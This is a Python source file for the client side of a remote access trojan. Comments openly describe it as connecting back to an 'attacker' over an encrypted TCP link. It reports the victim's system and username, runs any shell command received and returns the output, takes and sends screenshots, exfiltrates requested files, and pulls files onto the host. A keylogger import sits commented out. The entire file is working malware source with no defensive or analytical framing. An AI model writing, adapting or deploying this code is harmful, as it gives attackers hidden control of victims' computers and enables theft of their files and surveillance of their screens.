#!/usr/bin/python3.7
# -*- coding: utf-8 -*
import socket, subprocess, os, platform, logging,time,getpass, encrypted_connection
from threading import Thread
if platform.system() == "Windows" :
    from PIL import ImageGrab
else :
    import pyscreenshot as ImageGrab
#from pynput.keyboard import Key, Listener
HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 6969 # attacker's port on which server is listening


# same syntax here as for the server
encrypter = encrypted_connection.client(b"d41d8cd98f00b205")
encrypter.initialize_tcp_connexion_client(HOST,PORT)
defaultPath = os.getcwd()
encrypter.send_message_client("Nom : "+os.name+"\n"
                              "Systeme : "+platform.system()+"\n"
                              "Kernel : "+ platform.release() + "\n"
                              "User : "+getpass.getuser() + "\n"
                              "Default path : "+ defaultPath )
 
while True:
    command = ""
    command = encrypter.receive_message_client()
    #print("Received command : " +command)
    if(command.split()[0] == "cd"):
            if len(command.split()) == 1:
                encrypter.send_message_client((os.getcwd()))
            elif len(command.split()) == 2:
                try:
                    os.chdir(command.split()[1])
                    encrypter.send_message_client(("Directory : " + os.getcwd()))
                except OSError as winerror:
                    encrypter.send_message_client(("No such directory in : " +os.getcwd()))
    elif command == "stb" :
        im = ImageGrab.grab()
        fileName = "pic.png"
        try :
            im.save(fileName)
            encrypter.UploadFile(fileName)
            os.remove(fileName)
        except :
            encrypter.send_message_client(("permissionsfailed"))
    elif "dl" in command :
        split_command = command.split()
        try :
            encrypter.UploadFile(split_command[1])
        except:
           encrypter.send_message_client(("permissionsfailed"))
    elif "upload" in command :
        split_command = command.split()
        try :
            encrypter.DownloadFile(defaultPath,split_command[1])
        except:
           encrypter.send_message_client(("permissionsfailed"))
    elif command == "exit" :
        break
    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send output to attacker
        if(stdout_value != ""):
            encrypter.send_raw_data_client(stdout_value)  # renvoit l'output  à l'attaquant
            #print(stdout_value.decode("utf-8"))
        else:
            encrypter.send_raw_data_client((command+ " does not return anything"))
encrypter.close_tcp_connexion_client()